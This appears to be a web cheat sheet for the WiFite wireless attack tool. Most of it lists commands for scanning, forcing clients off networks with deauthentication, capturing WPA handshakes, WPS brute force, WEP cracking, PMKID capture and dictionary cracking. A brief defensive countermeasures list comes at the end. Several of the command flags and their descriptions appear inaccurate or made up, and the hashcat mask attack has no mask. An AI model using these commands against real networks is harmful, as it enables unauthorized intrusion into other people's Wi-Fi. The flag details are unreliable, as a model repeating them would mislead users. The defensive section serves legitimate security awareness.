WiFite - Automated Wireless Network Auditor

WiFite is a complete automated wireless attack and auditing tool. This page documents commands for authorized red team assessments and defensive awareness.

Installation

sudo apt-get install git python3 aircrack-ng mdk3
git clone https://github.com/derv82/wifite2.git
cd wifite2
sudo chmod +x wifite.py
sudo python3 wifite.py --help

Defense: Monitor for wifite2 repository clones and Python script execution with aircrack tools.

Basic Scan and Automatic Attack

sudo python3 wifite.py

Launch wifite in interactive mode. Scans all networks and displays menu for automated attacks.

Scan Specific Channel

sudo python3 wifite.py -c 6

Limit scanning to specific channel(s). Multiple channels: -c 1,6,11

Target Specific Network by BSSID

sudo python3 wifite.py -b AA:BB:CC:DD:EE:FF

Attack only an explicitly targeted MAC address after finding network.

Skip Networks Without Handshakes

sudo python3 wifite.py --no-handshake-failure

Automatically skip networks where handshake capture fails, saving time.

Wordlist-Only Attack Mode

sudo python3 wifite.py --attack-all --wordlist /usr/share/wordlists/rockyou.txt

Use only dictionary attacks, skip WEP and WPS brute force methods.

Automatic WEP Cracking

sudo python3 wifite.py --skip-wpa

Focus on legacy WEP networks. Captures IV packets and auto-cracks key.

WPA Handshake Capture

sudo python3 wifite.py --keep-ivs

Capture WPA/WPA2 handshakes. Wifite deauths clients to force reconnection and handshake capture.

Enable Script Attacks

sudo python3 wifite.py --aruba --uber

Enable targeting of specific router vulnerabilities (Aruba Networks, etc.).

Monitor Specific Interface

sudo python3 wifite.py -i wlan0mon

Specify wireless interface. Wifite auto-enables monitor mode if needed.

Continue Previous Attack

sudo python3 wifite.py --recrack

Resume from previous WPA handshake files. Useful for long dictionary attacks.

Custom Wordlist Attack

sudo python3 wifite.py --wordlist /path/to/custom-passwords.txt
# Wifite attempts each password in order

Supply custom password list for post-handshake brute force attempts.

WPS Brute Force Attack

sudo python3 wifite.py --kill-wps

Target vulnerable routers with default or weak WPS pins (4-8 digits).

Verbose Output and Logging

sudo python3 wifite.py -v

Enable verbose mode to see detailed attack progress and capture details.

5GHz Network Targeting

sudo python3 wifite.py -c 36,40,44,48 -n

Target 5GHz networks on channels 36-48 (USA). Add more channels as needed for region.

Save Captures to Custom Directory

sudo python3 wifite.py --output /tmp/wifite-captures/
ls /tmp/wifite-captures/

Store handshake files and logs in custom directory for organization.

Full Manual Workflow

# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Scan networks
sudo airodump-ng wlan0mon

# 3. Target and capture handshake
sudo airodump-ng -c 6 -b AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# 4. In another terminal, send deauth
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack with wifite
sudo python3 wifite.py --recrack --wordlist /usr/share/wordlists/rockyou.txt

Step-by-step manual execution of wifite-automated workflow.

PMKID Attack (New Method)

sudo hcxdumptool -i wlan0mon --active_beacon -o pmkid.pcap
sudo hashcat -m 16800 -a 3 pmkid.16800

Wifite may integrate PMKID attacks for faster WPA2/WPA3 cracking.

Cleanup Monitor Mode

sudo airmon-ng stop wlan0mon
sudo systemctl restart networking

Disable monitor mode and restore normal wireless operation.

Combined Attack with Multiple Wordlists

cat /usr/share/wordlists/rockyou.txt /usr/share/wordlists/passwords.txt > combined.txt
sudo python3 wifite.py --wordlist combined.txt --recrack

Merge multiple wordlists for comprehensive password attack.

Blue Team: Defensive Countermeasures

Network Security:

  • Disable WEP (deprecated, use WPA2/WPA3 only)
  • Disable WPS on all routers (major vulnerability)
  • Enforce 16+ character passwords with mixed case, numbers, symbols
  • Use WPA3 where available for stronger security
  • Implement rate limiting on authentication attempts

Detection and Monitoring:

  • Monitor for rapid client deauthentication events
  • Alert on failed authentication attempts exceeding threshold
  • Track monitor interface creation (wlan0mon, etc.)
  • Monitor airmon-ng, airodump-ng, aireplay-ng processes
  • Log all Python script execution with packet capture tools
  • Implement wireless IDS to detect IV injection and unusual patterns

User Education:

  • Teach verification of network names and trust settings
  • Warn against connecting to suspicious open networks
  • Require VPN for sensitive work on WiFi
  • Educate on phishing via rogue access points
